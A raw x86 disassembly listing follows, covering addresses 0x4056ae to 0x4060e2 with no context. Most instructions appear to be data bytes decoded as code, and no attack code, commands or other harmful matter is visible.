  4056ae:	jo     0x40570c
  4056b0:	push   eax
  4056b1:	scas   al,BYTE PTR es:[edi]
  4056b2:	or     eax,0xcdff375b
  4056b7:	jmp    0x887f:0x2af0989b
  4056be:	sahf   
  4056bf:	stos   BYTE PTR es:[edi],al
  4056c0:	(bad)  
  4056c2:	and    esp,DWORD PTR [ebp-0x1afabf7b]
  4056c8:	shl    DWORD PTR [esi],1
  4056ca:	cwde   
  4056cb:	pop    es
  4056cc:	popf   
  4056cd:	pop    ds
  4056ce:	sub    DWORD PTR [eax+0x1e4c7838],eax
  4056d4:	mov    ds:0x2ff5b2d7,eax
  4056d9:	mov    al,0xc7
  4056db:	stos   DWORD PTR es:[edi],eax
  4056dc:	sub    al,0xb6
  4056de:	push   ss
  4056df:	in     al,dx
  4056e0:	test   al,0xd1
  4056e2:	imul   esp,edx,0x33
  4056e5:	jle    0x405764
  4056e7:	popa   
  4056e8:	lahf   
  4056e9:	sbb    eax,esp
  4056eb:	push   es
  4056ec:	iret   
  4056ed:	and    BYTE PTR [ecx],ah
  4056ef:	mov    edi,0x6114468a
  4056f4:	aad    0xe8
  4056f6:	stos   BYTE PTR es:[edi],al
  4056f7:	clc    
  4056f8:	or     DWORD PTR [esi-0x615f4f71],0x0
	...
  40571a:	add    BYTE PTR [eax],al
  40571c:	mov    ecx,0xbcf93438
  405721:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405723:	push   esi
  405724:	loop   0x405774
  405726:	sub    esi,DWORD PTR [ecx]
  405728:	aaa    
  405729:	add    BYTE PTR [edx-0x296e71f7],0x6d
  405730:	jae    0x4056cd
  405732:	mov    ecx,eax
  405734:	adc    eax,0xe8a5cd6c
  405739:	jnp    0x40577e
  40573b:	loope  0x4056e6
  40573d:	fwait
  40573e:	pop    DWORD PTR [esi+0x293cb14c]
  405744:	repnz adc DWORD PTR [eax-0x250038b2],ebx
  40574b:	in     eax,0xb8
  40574d:	mov    ?,WORD PTR [ebx+0x71]
  405750:	cld    
  405751:	imul   esi,DWORD PTR [ecx-0x22],0x7ac91760
  405758:	xor    al,0xf4
  40575a:	adc    BYTE PTR [edi+0x3b294644],0xbb
  405761:	loop   0x40577d
  405763:	nop
  405764:	or     al,0xc0
  405766:	add    DWORD PTR [ebx+esi*2+0x5b],0xffffffde
  40576b:	jp     0x4057c0
  40576d:	hlt    
  40576e:	sub    eax,0x341725de
  405773:	jno    0x4057f0
  405775:	imul   eax,esp,0x348edde5
  40577b:	sbb    eax,0xb9b3faf4
	...
  40579c:	add    BYTE PTR [eax],al
  40579e:	dec    ebx
  40579f:	and    dh,cl
  4057a1:	fadd   QWORD PTR es:[edx-0x5a7c4df2]
  4057a8:	stos   DWORD PTR es:[edi],eax
  4057a9:	sti    
  4057aa:	sub    BYTE PTR [esi],0x23
  4057ad:	push   edi
  4057ae:	mov    ah,0xc9
  4057b0:	add    BYTE PTR [ebx+ecx*2],al
  4057b3:	mov    bh,0xb9
  4057b5:	push   eax
  4057b6:	in     al,dx
  4057b7:	push   ebx
  4057b8:	jno    0x40576b
  4057ba:	fsub   QWORD PTR [ebp-0x7f1cdb47]
  4057c0:	retf   
  4057c1:	mov    ecx,0x1e531f84
  4057c6:	fwait
  4057c7:	cld    
  4057c8:	in     eax,dx
  4057c9:	dec    esi
  4057ca:	stos   DWORD PTR es:[edi],eax
  4057cb:	push   ebx
  4057cc:	sahf   
  4057cd:	add    ecx,DWORD PTR [eax+edi*4-0x7c]
  4057d1:	pop    eax
  4057d2:	repz leave 
  4057d4:	repz sti 
  4057d6:	add    eax,0xc315e42d
  4057db:	jne    0x405761
  4057dd:	ret    0x90f4
  4057e0:	add    BYTE PTR [esi+0x10],bh
  4057e3:	jp     0x4057f6
  4057e5:	fiadd  WORD PTR [ebp-0x61]
  4057e8:	je     0x405865
  4057ea:	cmp    DWORD PTR [eax+0x51cad3cd],edi
  4057f0:	test   al,0xd1
  4057f2:	aaa    
  4057f3:	lock inc ebp
  4057f5:	imul   esi,DWORD PTR [edx+0x47212309],0x1889751a
  4057ff:	dec    DWORD PTR [edi]
  405801:	jnp    0x405803
	...
  40581f:	add    ch,cl
  405821:	popa   
  405822:	(bad)  
  405823:	and    esp,DWORD PTR [eax]
  405825:	(bad)  
  405826:	fwait
  405827:	ds gs (bad) 
  40582a:	and    cl,dh
  40582c:	imul   BYTE PTR [edx+0x47]
  40582f:	aam    0x43
  405831:	xlat   BYTE PTR ds:[ebx]
  405832:	test   al,0x24
  405834:	fidiv  WORD PTR [edx]
  405836:	int3   
  405837:	aas    
  405838:	adc    ah,BYTE PTR [edx-0x796050fa]
  40583e:	arpl   WORD PTR [ebp+0x458cda4a],dx
  405844:	mov    DWORD PTR [esi],edi
  405846:	call   0x515805eb
  40584b:	sub    BYTE PTR [eax],ah
  40584d:	repnz xor edi,DWORD PTR [edx]
  405850:	mov    bh,0x4f
  405852:	fiadd  DWORD PTR [edx+0x3abfaa28]
  405858:	xchg   DWORD PTR [ecx+0x5ed3f2e9],edi
  40585e:	mov    eax,ss
  405860:	sahf   
  405861:	add    DWORD PTR [edx+0x48],esp
  405864:	cmp    ah,BYTE PTR [edi]
  405866:	pop    es
  405867:	and    eax,0x65be2ee0
  40586c:	jne    0x405838
  40586e:	fidivr DWORD PTR [edi-0x28]
  405871:	jbe    0x4058a8
  405873:	jmp    FWORD PTR [edx+edx*4+0x50]
  405877:	add    BYTE PTR [edx],al
  405879:	fdivr  DWORD PTR [eax-0x218b1567]
  40587f:	cld    
  405880:	test   al,0xe1
  405882:	jo     0x405896
	...
  4058a0:	add    BYTE PTR [eax],al
  4058a2:	inc    eax
  4058a3:	pop    ebp
  4058a4:	push   ss
  4058a5:	ja     0x405884
  4058a7:	mov    dh,0x2d
  4058a9:	into   
  4058aa:	and    eax,0x37ab4912
  4058af:	scas   eax,DWORD PTR es:[edi]
  4058b0:	in     eax,0x45
  4058b2:	mov    edi,0x720817b
  4058b7:	pop    ebp
  4058b8:	xchg   ecx,eax
  4058b9:	jbe    0x40586a
  4058bb:	fcomip st,st(5)
  4058bd:	adc    ebp,DWORD PTR [ebp-0xa02a696]
  4058c3:	aad    0x3d
  4058c5:	cwde   
  4058c6:	pop    eax
  4058c7:	add    BYTE PTR [esi],0x21
  4058ca:	mov    al,ds:0xb24460be
  4058cf:	or     ecx,esi
  4058d1:	stos   BYTE PTR es:[edi],al
  4058d2:	dec    edx
  4058d3:	mov    bh,0xa8
  4058d5:	iret   
  4058d6:	jb     0x4058d7
  4058d8:	inc    eax
  4058d9:	cmp    BYTE PTR [edx-0x3d],bl
  4058dc:	es pop ebp
  4058de:	clc    
  4058df:	cmc    
  4058e0:	mov    BYTE PTR [ebx-0x2911b590],dh
  4058e6:	dec    ebp
  4058e7:	xchg   ecx,eax
  4058e8:	aad    0x6f
  4058ea:	xchg   ebp,eax
  4058eb:	and    eax,0x88870ab1
  4058f0:	sbb    eax,0x792befe4
  4058f5:	xor    DWORD PTR [edi-0x202896b6],0x3db20df6
  4058ff:	ret    0x5ca1
  405902:	gs std 
  405904:	lds    edi,FWORD PTR [ecx]
	...
  405922:	add    BYTE PTR [eax],al
  405924:	mov    BYTE PTR ds:0x891080fe,ch
  40592a:	cwde   
  40592b:	in     eax,0xd
  40592d:	out    dx,eax
  40592e:	arpl   WORD PTR [esi],si
  405930:	push   es
  405931:	das    
  405932:	lock push eax
  405934:	jecxz  0x405954
  405936:	es push ss
  405938:	jb     0x4058c9
  40593a:	test   eax,0x1f054f71
  40593f:	fsubp  st(1),st
  405941:	xor    al,0xb3
  405943:	mov    ecx,0x81078fc4
  405948:	sbb    eax,0x78e64c28
  40594d:	cmp    al,BYTE PTR [ecx]
  40594f:	dec    ecx
  405950:	xchg   esi,eax
  405951:	xchg   ecx,eax
  405952:	push   esp
  405953:	cs repz pop ecx
  405956:	mov    cl,0x3e
  405958:	push   ebp
  405959:	add    bl,BYTE PTR [esi]
  40595b:	pop    ecx
  40595c:	xor    BYTE PTR [eax],al
  40595e:	stos   DWORD PTR es:[edi],eax
  40595f:	test   dh,0x67
  405962:	es xchg ecx,eax
  405964:	stos   DWORD PTR es:[edi],eax
  405965:	push   esp
  405966:	push   ebx
  405967:	test   eax,0xce00350a
  40596c:	addr16 aas 
  40596e:	dec    ebp
  40596f:	popa   
  405970:	sbb    DWORD PTR [esi+0x8],0x398dc06
  405977:	add    BYTE PTR ds:0xd000399,cl
  40597d:	cdq    
  40597e:	add    eax,DWORD PTR [eax]
  405980:	or     eax,0xd000399
  405985:	cdq    
  405986:	add    eax,DWORD PTR [eax]
	...
  4059a4:	add    BYTE PTR [eax],al
  4059a6:	or     eax,0xd000399
  4059ab:	cdq    
  4059ac:	add    eax,DWORD PTR [eax]
  4059ae:	or     eax,0xd000399
  4059b3:	cwde   
  4059b4:	add    eax,DWORD PTR [eax]
  4059b6:	or     eax,0xd000398
  4059bb:	cwde   
  4059bc:	add    eax,DWORD PTR [eax]
  4059be:	or     eax,0xd000398
  4059c3:	add    bl,ch
  4059c5:	add    ecx,DWORD PTR ds:0xd03eb00
  4059cb:	add    bl,ch
  4059cd:	add    ecx,DWORD PTR ds:0xd03eb00
  4059d3:	add    dl,ch
  4059d5:	add    ecx,DWORD PTR ds:0xd03ea00
  4059db:	add    dl,ch
  4059dd:	add    ecx,DWORD PTR ds:0xd03ea00
  4059e3:	add    ch,ch
  4059e5:	add    ecx,DWORD PTR ds:0xd03e500
  4059eb:	add    ch,ch
  4059ed:	add    ecx,DWORD PTR ds:0xd03e500
  4059f3:	add    ah,ch
  4059f5:	add    ecx,DWORD PTR ds:0xd03e400
  4059fb:	add    ah,ch
  4059fd:	add    ecx,DWORD PTR ds:0xd03e400
  405a03:	add    cl,ch
  405a05:	add    ecx,DWORD PTR ds:0xf2f900
	...
  405a27:	add    ah,bh
  405a29:	jmp    eax
  405a2b:	add    al,0x4
  405a2d:	push   es
  405a2e:	jecxz  0x405a36
  405a30:	push   es
  405a31:	add    al,0xf5
  405a33:	add    BYTE PTR [eax],bl
  405a35:	add    ch,bh
  405a37:	add    dl,BYTE PTR [edx]
  405a39:	add    cl,ch
  405a3b:	add    ecx,DWORD PTR ds:0xd03e900
  405a41:	add    cl,ch
  405a43:	add    ecx,DWORD PTR ds:0xd03e900
  405a49:	add    al,ch
  405a4b:	add    ecx,DWORD PTR ds:0xd03e800
  405a51:	add    bl,ch
  405a53:	add    ecx,DWORD PTR ds:0xd03eb00
  405a59:	add    BYTE PTR [eax],al
  405a5b:	jmp    0xe:0xea00000e
  405a62:	add    ch,ch
  405a64:	push   cs
  405a65:	add    BYTE PTR [eax],al
  405a67:	in     eax,0xe
  405a69:	add    BYTE PTR [eax],al
  405a6b:	in     al,dx
  405a6c:	push   cs
  405a6d:	add    BYTE PTR [eax],al
  405a6f:	in     al,0xe
  405a71:	add    BYTE PTR [eax],al
  405a73:	out    dx,eax
  405a74:	push   cs
  405a75:	add    BYTE PTR [eax],al
  405a77:	out    0xe,eax
  405a79:	add    BYTE PTR [eax],al
  405a7b:	out    dx,al
  405a7c:	push   cs
  405a7d:	add    BYTE PTR [eax],al
  405a7f:	out    0xe,al
  405a81:	add    BYTE PTR [eax],al
  405a83:	icebp  
  405a84:	push   cs
  405a85:	add    BYTE PTR [eax],al
  405a87:	icebp  
  405a88:	push   cs
  405a89:	add    BYTE PTR [eax],al
  405a8b:	loopne 0x405a8d
	...
  405aa9:	add    BYTE PTR [esi],cl
  405aab:	add    BYTE PTR [eax],al
  405aad:	loopne 0x405abd
  405aaf:	add    BYTE PTR [eax],al
  405ab1:	repz push cs
  405ab3:	add    BYTE PTR [eax],al
  405ab5:	repz push cs
  405ab7:	add    BYTE PTR [eax],al
  405ab9:	loop   0x405ac9
  405abb:	add    BYTE PTR [eax],al
  405abd:	loop   0x405acd
  405abf:	add    BYTE PTR [eax],al
  405ac1:	cmc    
  405ac2:	push   cs
  405ac3:	add    BYTE PTR [eax],al
  405ac5:	in     eax,dx
  405ac6:	push   cs
  405ac7:	add    BYTE PTR [eax],al
  405ac9:	in     al,0xe
  405acb:	add    BYTE PTR [eax],al
  405acd:	fmul   QWORD PTR [esi]
  405acf:	add    BYTE PTR [eax],al
  405ad1:	jmp    0xe9405ae4
  405ad6:	push   cs
  405ad7:	add    BYTE PTR [eax],al
  405ad9:	jmp    0xe9405aec
  405ade:	push   cs
  405adf:	add    BYTE PTR [eax],al
  405ae1:	jmp    0xe9405af4
  405ae6:	push   cs
  405ae7:	add    BYTE PTR [eax],al
  405ae9:	jmp    0xe9405afc
  405aee:	push   cs
  405aef:	add    BYTE PTR [eax],al
  405af1:	add    BYTE PTR [eax+eax*1+0x0],dh
  405af5:	add    BYTE PTR [eax+eax*1+0x0],dh
  405af9:	add    BYTE PTR [eax+eax*1+0x0],ah
  405afd:	add    BYTE PTR [eax+eax*1+0x0],ah
  405b01:	add    BYTE PTR [eax+eax*1+0x0],dh
  405b05:	add    BYTE PTR [eax+eax*1+0x0],dh
  405b09:	add    BYTE PTR [eax+eax*1+0x0],ah
	...
  405b29:	add    BYTE PTR [eax],al
  405b2b:	add    BYTE PTR [eax+eax*1+0x0],ah
  405b2f:	add    BYTE PTR [esi],dh
  405b31:	add    BYTE PTR [eax],al
  405b33:	add    BYTE PTR [edi],dh
  405b35:	add    BYTE PTR [eax],al
  405b37:	add    BYTE PTR [ebx],ch
  405b39:	add    BYTE PTR [eax],al
  405b3b:	add    BYTE PTR [eax+eax*1],ah
  405b3e:	add    BYTE PTR [eax],al
  405b40:	and    BYTE PTR [eax],al
  405b42:	or     BYTE PTR [eax],al
  405b44:	mov    al,0x0
  405b46:	or     BYTE PTR [eax],al
  405b48:	jo     0x405b4a
  405b4a:	or     BYTE PTR [eax],al
  405b4c:	lock add BYTE PTR [eax],cl
  405b4f:	add    al,ah
  405b51:	inc    DWORD PTR [edi]
  405b53:	add    BYTE PTR [eax-0x1],dl
  405b56:	pop    es
  405b57:	add    BYTE PTR [eax-0xffff801],dl
  405b5d:	inc    BYTE PTR [edi]
  405b5f:	add    BYTE PTR [eax],dl
  405b61:	add    al,0x8
  405b63:	add    BYTE PTR [eax+0x4],ah
  405b66:	or     BYTE PTR [eax],al
  405b68:	and    BYTE PTR [eax+ecx*1],al
  405b6b:	add    BYTE PTR [eax+0x10000804],ah
  405b71:	add    al,0x8
  405b73:	add    BYTE PTR [eax+0x4],al
  405b76:	or     BYTE PTR [eax],al
  405b78:	add    BYTE PTR [eax+ecx*1],al
  405b7b:	add    BYTE PTR [eax+0x4],ah
  405b7e:	or     BYTE PTR [eax],al
  405b80:	mov    dh,0xff
  405b82:	pop    es
  405b83:	add    BYTE PTR [esi],dh
  405b85:	add    al,0x8
  405b87:	add    BYTE PTR ds:0xd0803d7,cl
  405b8d:	push   edi
  405b8e:	add    al,0x8
	...
  405bac:	add    BYTE PTR [eax],al
  405bae:	or     eax,0xd0803b7
  405bb3:	aaa    
  405bb4:	add    al,0x8
  405bb6:	or     eax,0xd0803f7
  405bbb:	ja     0x405bc1
  405bbd:	or     BYTE PTR ds:0xd080387,cl
  405bc3:	pop    es
  405bc4:	add    al,0x8
  405bc6:	or     eax,0xd080347
  405bcb:	mov    DWORD PTR [ebx],0x3870d08
  405bd1:	or     BYTE PTR ds:0xd080407,cl
  405bd7:	inc    edi
  405bd8:	add    ecx,DWORD PTR [eax]
  405bda:	or     eax,0xd0803c7
  405bdf:	pop    DWORD PTR [ebx]
  405be1:	or     BYTE PTR ds:0xd08040f,cl
  405be7:	pop    edi
  405be8:	add    ecx,DWORD PTR [eax]
  405bea:	or     eax,0xd0803df
  405bef:	scas   eax,DWORD PTR es:[edi]
  405bf0:	add    ecx,DWORD PTR [eax]
  405bf2:	or     eax,0xd08042f
  405bf7:	jg     0x405bfc
  405bf9:	or     BYTE PTR ds:0xd0803ff,cl
  405bff:	inc    DWORD PTR [ebx]
  405c01:	or     BYTE PTR ds:0xd08037f,cl
  405c07:	iret   
  405c08:	add    ecx,DWORD PTR [eax]
  405c0a:	or     eax,0xd08034f
  405c0f:	inc    DWORD PTR [ebx]
  405c11:	or     BYTE PTR [eax],al
	...
  405c2f:	add    BYTE PTR ds:0xd08037f,cl
  405c35:	iret   
  405c36:	add    ecx,DWORD PTR [eax]
  405c38:	or     eax,0xd08034f
  405c3d:	add    bh,ch
  405c3f:	add    edx,DWORD PTR ds:0x5036700
  405c45:	add    BYTE PTR [edi],ch
  405c47:	add    al,0x5
  405c49:	add    BYTE PTR [edi-0x30ffeafd],ah
  405c4f:	add    edx,DWORD PTR ds:0x5034700
  405c55:	add    BYTE PTR [edi],cl
  405c57:	add    al,0x5
  405c59:	add    BYTE PTR [edi-0xffeafd],al
  405c5f:	add    edx,DWORD PTR ds:0x5037700
  405c65:	add    BYTE PTR [edi+0x37000503],bh
  405c6b:	add    edx,DWORD PTR ds:0x1503ff00
  405c71:	add    BYTE PTR [edi+0x3],dh
  405c74:	add    eax,0x503bf00
  405c79:	add    BYTE PTR [edi],dh
  405c7b:	add    edx,DWORD PTR ds:0x1503f700
  405c81:	add    BYTE PTR [edi+0x3],ch
  405c84:	add    eax,0x503a700
  405c89:	add    BYTE PTR [edi],bl
  405c8b:	add    edx,DWORD PTR ds:0x1503d700
  405c91:	add    BYTE PTR [edi+0x3],cl
	...
  405cb0:	add    BYTE PTR [eax],al
  405cb2:	add    eax,0x5038700
  405cb7:	add    bh,bh
  405cb9:	add    dl,BYTE PTR ds:0x15040700
  405cbf:	add    BYTE PTR [edi+0x4],bh
  405cc2:	add    eax,0x5043700
  405cc7:	add    BYTE PTR [edi+0x7001504],ch
  405ccd:	add    al,0x15
  405ccf:	add    BYTE PTR [edi+0x4],bh
  405cd2:	add    eax,0x9370000
  405cd7:	clc    
  405cd8:	jmp    FWORD PTR [esi-0x180007ef]
  405cde:	push   cs
  405cdf:	clc    
  405ce0:	jmp    DWORD PTR [edi+0x11]
  405ce3:	clc    
  405ce4:	jmp    DWORD PTR [edi]
  405ce6:	or     eax,edi
  405ce8:	jmp    DWORD PTR [edi-0x380007ef]
  405cee:	push   cs
  405cef:	clc    
  405cf0:	inc    DWORD PTR [edi+0x11]
  405cf3:	clc    
  405cf4:	inc    DWORD PTR [edi]
  405cf6:	or     eax,edi
  405cf8:	inc    DWORD PTR [edi-0x80007ef]
  405cfe:	push   cs
  405cff:	clc    
  405d00:	push   DWORD PTR [edi+0x11]
  405d03:	clc    
  405d04:	push   DWORD PTR [edi+0x37fff80e]
  405d0a:	adc    eax,edi
  405d0c:	push   edi
  405d0e:	push   cs
  405d0f:	clc    
  405d10:	push   DWORD PTR [edi+0x11]
  405d13:	clc    
  405d14:	push   DWORD PTR [edi+0x0]
	...
  405d32:	add    BYTE PTR [eax],al
  405d34:	push   cs
  405d35:	clc    
  405d36:	push   DWORD PTR [edi]
  405d38:	adc    eax,edi
  405d3a:	(bad)  
  405d3b:	out    dx,eax
  405d3c:	push   cs
  405d3d:	clc    
  405d3e:	jmp    FWORD PTR [edi+0x11]
  405d41:	clc    
  405d42:	call   FWORD PTR [edi+0x1ffff80e]
  405d48:	adc    eax,edi
  405d4a:	dec    edi
  405d4c:	push   cs
  405d4d:	clc    
  405d4e:	dec    DWORD PTR [edi+0x11]
  405d51:	clc    
  405d52:	(bad)  
  405d53:	jg     0x405d63
  405d55:	clc    
  405d56:	(bad)  
  405d57:	call   DWORD PTR [ecx]
  405d59:	clc    
  405d5a:	(bad)  
  405d5b:	dec    DWORD PTR [ecx]
  405d5d:	clc    
  405d5e:	(bad)  
  405d5f:	jg     0x405d6f
  405d61:	clc    
  405d62:	jmp    FWORD PTR [edi]
  405d64:	or     eax,edi
  405d66:	jmp    FWORD PTR [edi-0x7f2]
  405d6c:	or     eax,0x8d000804
  405d71:	cld    
  405d72:	pop    es
  405d73:	add    ch,bh
  405d75:	add    ecx,DWORD PTR [eax]
  405d77:	add    BYTE PTR [ebp-0x4],bl
  405d7a:	pop    es
  405d7b:	add    BYTE PTR [ecx+0x310007fc],dh
  405d81:	std    
  405d82:	pop    es
  405d83:	add    cl,ah
  405d85:	add    ecx,DWORD PTR [eax]
  405d87:	add    BYTE PTR [ecx+0x510007fc],dh
  405d8d:	cld    
  405d8e:	pop    es
  405d8f:	add    cl,dl
  405d91:	cld    
  405d92:	pop    es
  405d93:	add    BYTE PTR [ecx],al
  405d95:	add    al,0x8
	...
  405db3:	add    BYTE PTR [eax],al
  405db5:	add    BYTE PTR [ecx+0x610007fc],dl
  405dbb:	cld    
  405dbc:	pop    es
  405dbd:	add    cl,ah
  405dbf:	cld    
  405dc0:	pop    es
  405dc1:	add    BYTE PTR [ecx+0x10007fc],dl
  405dc7:	std    
  405dc8:	pop    es
  405dc9:	add    BYTE PTR [ecx-0x4],al
  405dcc:	pop    es
  405dcd:	add    cl,al
  405dcf:	cld    
  405dd0:	pop    es
  405dd1:	add    BYTE PTR [ecx-0x4],dh
  405dd4:	pop    es
  405dd5:	add    cl,ah
  405dd7:	cld    
  405dd8:	pop    es
  405dd9:	add    BYTE PTR [ecx],bl
  405ddb:	cld    
  405ddc:	pop    es
  405ddd:	add    BYTE PTR [ecx+0x690007fc],ch
  405de3:	cld    
  405de4:	pop    es
  405de5:	add    BYTE PTR [ecx],ch
  405de7:	add    ecx,DWORD PTR [eax]
  405de9:	add    cl,bl
  405deb:	add    ecx,DWORD PTR [eax]
  405ded:	add    BYTE PTR [ecx+0x3],cl
  405df0:	or     BYTE PTR [eax],al
  405df2:	mov    DWORD PTR [ebx],eax
  405df4:	or     BYTE PTR [eax],al
  405df6:	jmp    0x94065fd
  405dfb:	cld    
  405dfc:	pop    es
  405dfd:	add    BYTE PTR [ecx-0x4],bl
  405e00:	pop    es
  405e01:	add    BYTE PTR ds:0xd0803cc,cl
  405e07:	push   esp
  405e08:	add    al,0x8
  405e0a:	or     eax,0xd0803fc
  405e0f:	add    al,0x4
  405e11:	or     BYTE PTR ds:0xd0803cc,cl
  405e17:	push   esp
  405e18:	add    al,0x8
	...
  405e36:	add    BYTE PTR [eax],al
  405e38:	or     eax,0xd09038a
  405e3d:	mov    al,BYTE PTR [ecx+ecx*1]
  405e40:	or     eax,0xd09040a
  405e45:	or     al,BYTE PTR ds:0x3ea0d09
  405e4b:	or     DWORD PTR ds:0xd0904ea,ecx
  405e51:	push   0x4
  405e53:	or     DWORD PTR ds:0xd09056a,ecx
  405e59:	jmp    0x904:0xea0d0903
  405e60:	or     eax,0xd09046a
  405e65:	push   0x5
  405e67:	or     DWORD PTR ds:0xd09034a,ecx
  405e6d:	dec    edx
  405e6e:	add    al,0x9
  405e70:	or     eax,0xd0903ca
  405e75:	retf   0x904
  405e78:	or     eax,0xd090392
  405e7d:	xchg   edx,eax
  405e7e:	add    al,0x9
  405e80:	or     eax,0xd090422
  405e85:	and    al,BYTE PTR ds:0x3520d09
  405e8b:	or     DWORD PTR ds:0xd090452,ecx
  405e91:	loop   0x405e96
  405e93:	or     DWORD PTR ds:0xd0904e2,ecx
  405e99:	add    BYTE PTR [edx],dl
  405e9b:	add    al,0x0
	...
  405eb9:	add    BYTE PTR [eax+eax*1],al
  405ebc:	adc    al,BYTE PTR ds:0x3820004
  405ec2:	adc    al,0x0
  405ec4:	add    BYTE PTR [esp+edx*1],0x0
  405ec8:	push   edx
  405ec9:	add    al,0x4
  405ecb:	add    BYTE PTR [edx+0x5],dl
  405ece:	add    al,0x0
  405ed0:	ret    0x1403
  405ed3:	add    dl,al
  405ed5:	add    al,0x14
  405ed7:	add    BYTE PTR [edx],al
  405ed9:	add    al,0x4
  405edb:	add    BYTE PTR [edx],al
  405edd:	add    eax,0x3720004
  405ee2:	adc    al,0x0
  405ee4:	jb     0x405eea
  405ee6:	adc    al,0x0
  405ee8:	and    al,BYTE PTR [esp+eax*1]
  405eeb:	add    BYTE PTR [edx],ah
  405eed:	add    eax,0x3920004
  405ef2:	adc    al,0x0
  405ef4:	xchg   edx,eax
  405ef5:	add    al,0x14
  405ef7:	add    BYTE PTR [edx],ah
  405ef9:	add    al,0x4
  405efb:	add    BYTE PTR [edx],ah
  405efd:	add    eax,0x3920004
  405f02:	adc    al,0x0
  405f04:	xchg   edx,eax
  405f05:	add    al,0x14
  405f07:	add    dl,al
  405f09:	add    eax,DWORD PTR [eax+eax*1]
  405f0c:	ret    0x404
  405f0f:	add    BYTE PTR [edx],dh
  405f11:	add    edx,DWORD PTR [eax+eax*1]
  405f14:	xor    al,BYTE PTR [esp+edx*1]
  405f17:	add    dh,ch
  405f19:	add    eax,DWORD PTR [eax+eax*1]
  405f1c:	out    0x4,al
	...
  405f3a:	add    BYTE PTR [eax],al
  405f3c:	add    al,0x0
  405f3e:	outs   dx,BYTE PTR ds:[esi]
  405f3f:	add    edx,DWORD PTR [eax+eax*1]
  405f42:	data16 add al,0x14
  405f45:	add    BYTE PTR [esi-0x59fffbfd],ch
  405f4b:	add    al,0x4
  405f4d:	add    BYTE PTR [eax],al
  405f4f:	cs push cs
  405f51:	idiv   edi
  405f53:	and    eax,0xdfff709
  405f58:	adc    edi,esi
  405f5a:	inc    DWORD PTR ds:0x8dfff70e
  405f60:	adc    edi,esi
  405f62:	inc    DWORD PTR [ebp+0x4dfff70e]
  405f68:	adc    edi,esi
  405f6a:	inc    DWORD PTR [ebp+0xe]
  405f6d:	idiv   edi
  405f6f:	int    0x11
  405f71:	idiv   edi
  405f73:	lds    ecx,FWORD PTR [esi]
  405f75:	idiv   edi
  405f77:	std    
  405f78:	push   cs
  405f79:	idiv   edi
  405f7b:	cmc    
  405f7c:	maskmovq mm7,mm7
  405f7f:	jge    0x405f92
  405f81:	idiv   edi
  405f83:	jne    0x405f93
  405f85:	idiv   edi
  405f87:	sbb    eax,0x15fff711
  405f8c:	push   cs
  405f8d:	idiv   edi
  405f8f:	popf   
  405f90:	adc    edi,esi
  405f92:	call   DWORD PTR [ebp+0x1dfff70e]
  405f98:	adc    edi,esi
  405f9a:	call   DWORD PTR ds:0x9dfff70e
	...
  405fbc:	add    BYTE PTR [eax],al
  405fbe:	adc    edi,esi
  405fc0:	call   DWORD PTR [ebp-0x420008f2]
  405fc6:	push   cs
  405fc7:	idiv   edi
  405fc9:	mov    ch,0xf
  405fcb:	idiv   edi
  405fcd:	cmp    eax,0x35fff711
  405fd2:	push   cs
  405fd3:	idiv   edi
  405fd5:	cmc    
  405fd6:	push   cs
  405fd7:	idiv   edi
  405fd9:	in     eax,dx
  405fda:	maskmovq mm7,mm7
  405fdd:	gs adc edi,esi
  405fe0:	call   FWORD PTR [ebp+0xe]
  405fe3:	idiv   edi
  405fe5:	inc    ebx
  405fe7:	add    BYTE PTR [ecx],cl
  405fe9:	add    BYTE PTR [ebx+0x33000901],ah
  405fef:	cld    
  405ff0:	or     BYTE PTR [eax],al
  405ff2:	add    eax,DWORD PTR [ecx]
  405ff4:	or     DWORD PTR [eax],eax
  405ff6:	add    edi,esp
  405ff8:	or     BYTE PTR [eax],al
  405ffa:	add    eax,DWORD PTR [ecx]
  405ffc:	or     DWORD PTR [eax],eax
  405ffe:	xchg   ebx,eax
  405fff:	add    BYTE PTR [ecx],cl
  406001:	add    BYTE PTR [ebx+0x2],al
  406004:	or     DWORD PTR [eax],eax
  406006:	arpl   sp,di
  406008:	or     BYTE PTR [eax],al
  40600a:	inc    ebx
  40600b:	add    DWORD PTR [ecx],ecx
  40600d:	add    bl,dl
  40600f:	add    BYTE PTR [ecx],cl
  406011:	add    BYTE PTR [ebx+0x1],ah
  406014:	or     DWORD PTR [eax],eax
  406016:	adc    edi,esp
  406018:	or     BYTE PTR [eax],al
  40601a:	xchg   ebx,eax
  40601b:	add    DWORD PTR [ecx],ecx
  40601d:	add    BYTE PTR [ebx],al
  40601f:	add    DWORD PTR [ecx],ecx
	...
  40603d:	add    BYTE PTR [eax],al
  40603f:	add    bl,dh
  406041:	add    DWORD PTR [ecx],ecx
  406043:	add    BYTE PTR [ebx],dh
  406045:	cld    
  406046:	or     BYTE PTR [eax],al
  406048:	adc    eax,DWORD PTR [ecx]
  40604a:	or     DWORD PTR [eax],eax
  40604c:	add    DWORD PTR [eax],0x9
  40604f:	add    BYTE PTR [ebx+0x33000901],dl
  406055:	cld    
  406056:	or     BYTE PTR [eax],al
  406058:	repz add BYTE PTR [ecx],cl
  40605b:	add    BYTE PTR [ebx-0x6cfff700],ah
  406061:	add    DWORD PTR [ecx],ecx
  406063:	add    BYTE PTR [ebx+0x0],dl
  406066:	or     DWORD PTR [eax],eax
  406068:	jae    0x40606b
  40606a:	or     DWORD PTR [eax],eax
  40606c:	jecxz  0x40606e
  40606e:	or     DWORD PTR [eax],eax
  406070:	repz add DWORD PTR [ecx],ecx
  406073:	add    BYTE PTR [eax+eax*1],ah
  406076:	pop    es
  406077:	add    BYTE PTR [eax+eax*1+0x7],ah
  40607b:	add    BYTE PTR ds:0xd0703b9,cl
  406081:	jns    0x406086
  406083:	pop    es
  406084:	or     eax,0xd0703a9
  406089:	imul   eax,DWORD PTR [ebx],0x3490d07
  40608f:	pop    es
  406090:	or     eax,0xd070309
  406095:	xchg   ecx,eax
  406096:	add    eax,DWORD PTR [edi]
  406098:	or     eax,0xd0703d1
  40609d:	add    DWORD PTR [edi+eax*1],eax
  4060a0:	or     eax,0x70441
	...
  4060c1:	add    BYTE PTR ds:0xd0703a1,cl
  4060c7:	loope  0x4060cc
  4060c9:	pop    es
  4060ca:	or     eax,0xd070391
  4060cf:	rol    DWORD PTR [ebx],1
  4060d1:	pop    es
  4060d2:	or     eax,0xd070395
  4060d7:	fld    QWORD PTR [ebx]
  4060d9:	pop    es
  4060da:	or     eax,0xd0703b5
  4060df:	std    
  4060e0:	add    eax,DWORD PTR [edi]
  4060e2:	or     eax,0xd0703a5
